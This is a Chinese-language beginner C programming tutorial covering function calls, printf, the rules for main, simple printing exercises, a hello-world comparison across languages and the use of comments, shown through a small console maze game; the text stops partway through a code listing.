<h2 id="如何执行定义好的函数"><a href="#如何执行定义好的函数" class="headerlink" title="如何执行定义好的函数"></a>如何执行定义好的函数</h2><p>主函数(main)会由系统自动调用, 但其它函数不会, 所以想要执行其它函数就必须在main函数中手动调用</p>
<p>call 代表找到名称叫做call的某个东西<br>() 代表要找到的名称叫call的某个东西是一个函数<br>; 代表调用函数的语句已经编写完成<br>所以call();代表找到call函数, 并执行call函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    call();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何往屏幕上输出内容:<br>1.输出内容是一个比较复杂的操作, 所以系统提前定义好了一个专门用于输出内容的函数叫做printf函数,我们只需要执行系统定义好的printf函数就可以往屏幕上输出内容<br>2.但凡需要执行一个函数, 都是通过函数名称+圆括号的形式来执行<br>3.如下代码的含义是: 当程序运行时系统会自动执行main函数, 在系统自动执行main函数时我们手动执行了call函数和printf函数<br>4.经过对代码的观察, 我们发现两个问题<br>       并没有告诉printf函数,我们要往屏幕上输出什么内容<br>        找不到printf函数的实现代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    call();</span><br><span class="line">    <span class="built_in">printf</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>如何告诉printf函数要输出的内容<ul>
<li>将要输出的内容编写到printf函数后面的圆括号中即可</li>
<li>注意: 圆括号中编写的内容必须用双引号引起来</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>如何找到printf函数的实现代码<ul>
<li>由于printf函数是系统实现的函数, 所以想要使用printf函数必须在使用之前告诉系统去哪里可以找到printf函数的实现代码</li>
<li>#include &lt;stdio.h&gt; 就是告诉系统可以去stdio这个文件中查找printf函数的声明和实现</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    call();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="main函数注意点及其它写法"><a href="#main函数注意点及其它写法" class="headerlink" title="main函数注意点及其它写法"></a>main函数注意点及其它写法</h2><ul>
<li>C语言中,每条完整的语句后面都必须以分号结尾</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>) <span class="comment">// 如果没有分号编译时会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果没有分号,多条语句合并到一行时, 系统不知道从什么地方到什么地方是一条完整语句</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>C语言中除了注释和双引号引起来的地方以外都不能出现中文</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>); <span class="comment">// 这里的分号如果是中文的分号就会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>一个C语言程序只能有一个main函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123; <span class="comment">// 编译时会报错, 重复定义</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一个C语言程序不能没有main函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call</span><span class="params">()</span></span>&#123; <span class="comment">// 编译时报错, 因为只有call函数, 没有main函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span>&#123; <span class="comment">// 编译时报错, 因为main函数的名称写错了,还是相当于没有main函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>main函数前面的int可以不写或者换成void（建议不要换，只是有时候你换了可能也对，但是很多编译器市不支持的，老老实实用最标准的格式是最好不过的：<code>int main(void)</code>,其次这个void最好养成加上的习惯，避免报错的风险）</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123; <span class="comment">// 最标准的形式，前面的int不加也不会报错</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>main函数中的return 0可以不写</li>
<li>return 语句（返回语句）是程序的最后一个语句。在 int main（void）中 int 表示 main（）函数的返回值应该是一个整数。C标准要求 main（）这样做。带有返回值的 C语言函数要使用一个 return 语句，该语句包括关键字 return，后面紧跟着要返回的值，然后是一个分号。对于 main（）函数来说，如果你漏掉了 return语句，则大多数编译器将对你的疏忽提出警告，但仍将编译该程序。此时，你可以暂时把 main（）中的 return语句看作是保持逻辑连贯性所需的内容。但对于某些操作系统（包括 DOS 和 UNIX ）而言，它有实际的用途。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; <span class="comment">// 不会报错</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>多种写法不报错的原因<ul>
<li>C语言最早的时候只是一种规范和标准(例如C89, C11等)</li>
<li>标准的推行需要各大厂商的支持和实施</li>
<li>而在支持的实施的时候由于各大厂商利益、理解等问题,导致了实施的标准不同,发生了变化<ul>
<li>Turbo C</li>
<li>Visual C(VC)</li>
<li>GNU C(GCC)</li>
</ul>
</li>
<li>所以大家才会看到不同的书上书写的格式有所不同, 有的返回int,有的返回void,有的甚至没有返回值</li>
<li>所以大家只需要记住最标准的写法即可</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Tips:</code><br><code>语法错误：编译器会直接报错</code><br><code>逻辑错误：没有语法错误，只不过运行结果不正确</code></p>
</blockquote>
<h2 id="C语言程序练习"><a href="#C语言程序练习" class="headerlink" title="C语言程序练习"></a>C语言程序练习</h2><ul>
<li>编写一个C语言程序,用至少2种方式在屏幕上输出以下内容</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> *** ***</span><br><span class="line">*********</span><br><span class="line"> *******</span><br><span class="line">  ****</span><br><span class="line">   **</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>普通青年实现</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; *** *** \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; *******\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  ****\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   **\n&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>2B青年实现</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; *** *** \n*********\n *******\n  ****\n   **\n&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>文艺青年实现(纯属装b)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>  i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; *** *** \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*********\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; *******\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  ****\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   **\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   ** ** \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  *******\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   *****\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    **\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    i++;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="初学者如何避免程序出现BUG"><a href="#初学者如何避免程序出现BUG" class="headerlink" title="初学者如何避免程序出现BUG"></a>初学者如何避免程序出现BUG</h2><p>大部分人都在关注你飞的高不高，却没人在乎你飞的累不累，这就是现实！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                   _ooOoo_</span><br><span class="line">                  o8888888o</span><br><span class="line">                  88&quot; . &quot;88</span><br><span class="line">                  (| -_- |)</span><br><span class="line">                   O\ = /O</span><br><span class="line">               ____/`---&#x27;\____</span><br><span class="line">             .   &#x27; \\| |// `.</span><br><span class="line">              / \\||| : |||// \</span><br><span class="line">            / _||||| -:- |||||- \</span><br><span class="line">              | | \\\ - /// | |</span><br><span class="line">            | \_| &#x27;&#x27;\---/&#x27;&#x27; | |</span><br><span class="line">             \ .-\__ `-` ___/-. /</span><br><span class="line">          ___`. .&#x27; /--.--\ `. . __</span><br><span class="line">       .&quot;&quot; &#x27;&lt; `.___\_&lt;|&gt;_/___.&#x27; &gt;&#x27;&quot;&quot;.</span><br><span class="line">      | | : `- \`.;`\ _ /`;.`/ - ` : | |</span><br><span class="line">        \ \ `-. \_ __\ /__ _/ .-` / /</span><br><span class="line">======`-.____`-.___\_____/___.-`____.-&#x27;======</span><br><span class="line">                   `=---=&#x27;</span><br><span class="line"></span><br><span class="line">.............................................</span><br><span class="line">       佛祖保佑                   有无BUG</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">━━━━━━神兽出没━━━━━━</span><br><span class="line">     　　  ┏┓　　　 ┏┓</span><br><span class="line">      　　┏┛┻━━━━━━┛┻┓</span><br><span class="line">      　　┃　　　     ┃</span><br><span class="line">      　　┃　　　━    ┃</span><br><span class="line">      　　┃　┳┛　  ┗┳ ┃</span><br><span class="line">      　　┃　　　     ┃</span><br><span class="line">      　　┃　　　┻    ┃</span><br><span class="line">      　　┃          ┃</span><br><span class="line">      　　┗━┓　　　 ┏━┛Code is far away from bug with the animal protecting</span><br><span class="line">      　　  ┃　　 　┃    神兽保佑,代码无bug</span><br><span class="line">      　  　┃　　 　┃</span><br><span class="line">      　  　┃　　　 ┗━━━┓</span><br><span class="line">      　  　┃　　　     ┣┓</span><br><span class="line">      　　  ┃　　　  ┏━━┛┛</span><br><span class="line">      　　  ┗┓┓┏━┳┓┏┛</span><br><span class="line">      　　   ┃┫┫ ┃┫┫</span><br><span class="line">      　　   ┗┻┛ ┗┻┛</span><br><span class="line"></span><br><span class="line">      ━━━━━━感觉萌萌哒━━━━━━</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="多语言对比"><a href="#多语言对比" class="headerlink" title="多语言对比"></a>多语言对比</h2><ul>
<li>C语言</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;好好学习&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>C++语言</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;好好学习&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>OC语言</li>
</ul>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">#import &lt;<span class="type">Foundation</span>/<span class="type">Foundation</span>.h&gt;</span><br><span class="line"><span class="built_in">int</span> main<span class="literal">()</span> &#123;</span><br><span class="line">    <span class="type">NSLog</span>(@<span class="string">&quot;好好学习&quot;</span>);</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Java语言</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> viod <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system.out.println(<span class="string">&quot;好好学习&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Go语言</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span>  <span class="string">&quot;fmt&quot;</span> <span class="comment">//引入fmt库</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;好好学习&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="什么是注释"><a href="#什么是注释" class="headerlink" title="什么是注释?"></a>什么是注释?</h2><ul>
<li>注释是在所有计算机语言中都非常重要的一个概念，从字面上看，就是注解、解释的意思</li>
<li>注释可以用来解释某一段程序或者某一行代码是什么意思，方便程序员之间的交流沟通</li>
<li>注释可以是任何文字，也就是说可以写中文</li>
<li>被注释的内容在开发工具中会有特殊的颜色</li>
</ul>
<h2 id="为什么要使用注释"><a href="#为什么要使用注释" class="headerlink" title="为什么要使用注释?"></a>为什么要使用注释?</h2><ul>
<li>没有编写任何注释的程序</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printMap</span><span class="params">(<span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">6</span>][<span class="number">7</span>] , <span class="keyword">int</span> row, <span class="keyword">int</span> col)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">6</span>][<span class="number">7</span>] = &#123;</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span> ,<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> row = <span class="keyword">sizeof</span>(<span class="built_in">map</span>)/<span class="keyword">sizeof</span>(<span class="built_in">map</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> col = <span class="keyword">sizeof</span>(<span class="built_in">map</span>[<span class="number">0</span>])/ <span class="keyword">sizeof</span>(<span class="built_in">map</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">    printMap(<span class="built_in">map</span>, row, col);</span><br><span class="line">    <span class="keyword">int</span> pRow = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> pCol = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> endRow = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> endCol = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="string">&#x27;R&#x27;</span> != <span class="built_in">map</span>[endRow][endCol]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;亲, 请输入相应的操作\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;w(向上走) s(向下走) a(向左走) d(向右走)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> run;</span><br><span class="line">        run = getchar();</span><br><span class="line">        <span class="keyword">switch</span> (run) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;#&#x27;</span> != <span class="built_in">map</span>[pRow + <span class="number">1</span>][pCol]) &#123;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    pRow++;<span class="comment">//3</span></span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;#&#x27;</span> != <span class="built_in">map</span>[pRow - <span class="number">1</span>][pCol]) &#123;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    pRow--;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;#&#x27;</span> != <span class="built_in">map</span>[pRow][pCol - <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    pCol--;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;#&#x27;</span> != <span class="built_in">map</span>[pRow][pCol + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    pCol++;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printMap(<span class="built_in">map</span>, row, col);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;你太牛X了\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;想挑战自己,请购买完整版本\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printMap</span><span class="params">(<span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">6</span>][<span class="number">7</span>] , <span class="keyword">int</span> row, <span class="keyword">int</span> col)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">map</span>[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>编写了注释的程序</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     R代表一个人</span></span><br><span class="line"><span class="comment">     #代表一堵墙</span></span><br><span class="line"><span class="comment">//   0123456</span></span><br><span class="line"><span class="comment">     ####### // 0</span></span><br><span class="line"><span class="comment">     #   #   // 1</span></span><br><span class="line"><span class="comment">     #R ## # // 2</span></span><br><span class="line"><span class="comment">     #   # # // 3</span></span><br><span class="line"><span class="comment">     ##    # // 4</span></span><br><span class="line"><span class="comment">     ####### // 5</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     分析:</span></span><br><span class="line"><span class="comment">     &gt;1.保存地图(二维数组)</span></span><br><span class="line"><span class="comment">     &gt;2.输出地图</span></span><br><span class="line"><span class="comment">     &gt;3.操作R前进(控制小人行走)</span></span><br><span class="line"><span class="comment">      3.1.接收用户输入(scanf/getchar)</span></span><br><span class="line"><span class="comment">      w(向上走) s(向下走) a(向左走) d(向右走)</span></span><br><span class="line"><span class="comment">      3.2.判断用户的输入,控制小人行走</span></span><br><span class="line"><span class="comment">         3.2.1.替换二维数组中保存的数据</span></span><br><span class="line"><span class="comment">             (</span></span><br><span class="line"><span class="comment">                1.判断是否可以修改(如果不是#就可以修改)</span></span><br><span class="line"><span class="comment">                2.修改现有位置为空白</span></span><br><span class="line"><span class="comment">                3.修改下一步为R</span></span><br><span class="line"><span class="comment">             )</span></span><br><span class="line"><span class="comment">      3.3.输出修改后的二维数组</span></span><br><span class="line"><span class="comment">     4.判断用户是否走出出口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 声明打印地图方法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printMap</span><span class="params">(<span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">6</span>][<span class="number">7</span>] , <span class="keyword">int</span> row, <span class="keyword">int</span> col)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1.定义二维数组保存迷宫地图</span></span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">6</span>][<span class="number">7</span>] = &#123;</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span> ,<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; 